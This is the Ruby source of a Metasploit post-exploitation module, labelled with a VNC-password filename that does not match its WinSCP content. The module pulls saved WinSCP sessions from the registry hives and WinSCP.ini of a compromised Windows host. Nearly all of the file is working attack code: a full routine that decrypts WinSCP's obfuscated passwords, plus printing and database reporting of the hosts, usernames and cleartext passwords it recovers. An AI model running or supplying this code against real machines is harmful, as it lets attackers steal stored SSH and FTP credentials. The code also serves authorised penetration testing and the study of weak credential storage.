# post/windows/gather/enum_vnc_pw.rb

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'rex/parser/ini'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
      'Description'   => %q{
        This module extracts weakly encrypted saved passwords from
        WinSCP. It searches for saved sessions in the Windows Registry
        and the WinSCP.ini file. It cannot decrypt passwords if a master
        password is used.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def get_reg
    # Enumerate all the SID in HKEY_Users and see if any of them have WinSCP RegistryKeys.
    regexists = 0

    userhives=load_missing_hives()
    userhives.each do |hive|
      next if hive['HKU'] == nil
      master_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"
      masterpw = registry_getvaldata(master_key, 'UseMasterPassword')

      #No WinSCP Keys here
      next if masterpw.nil?

      regexists = 1
      if masterpw == 1
        # Master Password used to add AES256 encryption to stored password
        print_error("User #{hive['HKU']} is using a Master Password, cannot recover passwords")
        next

      else
        # Take a look at any saved sessions
        savedpwds = 0
        session_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions"
        saved_sessions = registry_enumkeys(session_key)
        next if saved_sessions.nil?
        saved_sessions.each do |saved_session|
          # Skip default settings entry
          next if saved_session == "Default%20Settings"

          active_session = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{saved_session}"
          password = registry_getvaldata(active_session, 'Password')
          # There is no password saved for this session, so we skip it
          next if password == nil

          savedpwds = 1
          portnum = registry_getvaldata(active_session, 'PortNumber')
          if portnum == nil
            # If no explicit port number entry exists, it is set to default port of tcp22
            portnum = 22
          end

          user = registry_getvaldata(active_session, 'UserName') || ""
          host = registry_getvaldata(active_session, 'HostName') || ""
          proto = registry_getvaldata(active_session, 'FSProtocol') || ""

          # If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0
          # it is set to SCP.
          if proto == nil or proto == 0
            proto = "SSH"
          else
            proto = "FTP"
          end

          #Decrypt our password, and report on results
          pass= decrypt_password(password, user+host)
          print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
          if session.db_record
            source_id = session.db_record.id
          else
            source_id = nil
          end
          report_auth_info(
            :host  => host,
            :port => portnum,
            :sname => proto,
            :source_id => source_id,
            :source_type => "exploit",
            :user => user,
            :pass => pass
          )

        end

        if savedpwds == 0
          print_status("No Saved Passwords found in the Session Registry Keys")
        end
      end
    end

    if regexists == 0
      print_status("No WinSCP Registry Keys found!")
    end
    unload_our_hives(userhives)

  end


  def get_ini(filename)
    begin
      #opens the WinSCP.ini file for reading and loads it into the MSF Ini Parser
      client.fs.file.stat(filename)
      config = client.fs.file.new(filename,'r')
      parse = config.read
      print_status("Found WinSCP.ini file...")
      ini=Rex::Parser::Ini.from_s(parse)

      #if a Master Password is in use we give up
      if ini['Configuration\\Security']['MasterPassword'] == '1'
        print_status("Master Password Set, unable to recover saved passwords!")
        return nil
      end

      #Runs through each group in the ini file looking for all of the Sessions
      ini.each_key do |group|
        groupkey='Sessions'
        if group=~/#{groupkey}/
          #See if we have a password saved in this sessions
          if ini[group].has_key?('Password')
            # If no explicit port number is defined, then it is the default tcp 22
            if ini[group].has_key?('PortNumber')
              portnum = ini[group]['PortNumber']
            else
              portnum = 22
            end
            host= ini[group]['HostName']
            user= ini[group]['UserName']
            proto = ini[group]['FSProtocol']

            # If no explicit protocol entry exists it is on sFTP with SCP backup. If it
            # is 0 it is set to SCP.
            if proto == nil or proto == 0
              proto = "SSH"
            else
              proto = "FTP"
            end
            # Decrypt the password and report on all of the results
            pass= decrypt_password(ini[group]['Password'], user+host)
            print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
            if session.db_record
              source_id = session.db_record.id
            else
              source_id = nil
            end
            report_auth_info(
              :host  => host,
              :port => portnum,
              :sname => proto,
              :source_id => source_id,
              :source_type => "exploit",
              :user => user,
              :pass => pass
            )
          end
        end
      end
    rescue
      print_status("WinSCP.ini file NOT found...")
    end
  end

  def decrypt_next_char

    pwalg_simple_magic = 0xA3
    pwalg_simple_string = "0123456789ABCDEF"

    # Decrypts the next charachter in the password sequence
    if @password.length > 0
      # Takes the first char from the encrypted password and finds its position in the
      # pre-defined string, then left shifts the returned index by 4 bits
      unpack1 = pwalg_simple_string.index(@password[0,1])
      unpack1= unpack1 << 4

      # Takes the second char from the encrypted password and finds its position in the
      # pre-defined string
      unpack2 = pwalg_simple_string.index(@password[1,1])
      # Adds the two results, XORs against 0xA3, NOTs it and then ands it with 0xFF
      result= ~((unpack1+unpack2) ^ pwalg_simple_magic) & 0xff
      # Strips the first two chars off and returns our result
      @password = @password[2,@password.length]
      return result
    end

  end



  def decrypt_password(pwd, key)
    pwalg_simple_flag = 0xFF
    @password = pwd
    flag = decrypt_next_char()

    if flag == pwalg_simple_flag
      decrypt_next_char();
      length = decrypt_next_char();
    else
      length = flag;
    end
    ldel = (decrypt_next_char())*2 ;
    @password = @password[ldel,@password.length];
    result="";
    for ss in 0...length
      result+=decrypt_next_char().chr
    end

    if flag == pwalg_simple_flag
      result= result[key.length,result.length];

    end

    return result


  end

  def run
    print_status("Looking for WinSCP.ini file storage...")
    get_ini(client.fs.file.expand_path("%PROGRAMFILES%")+'\\WinSCP\\WinSCP.ini')
    print_status("Looking for Registry Storage...")
    get_reg()
    print_status("Done!")

  end



end
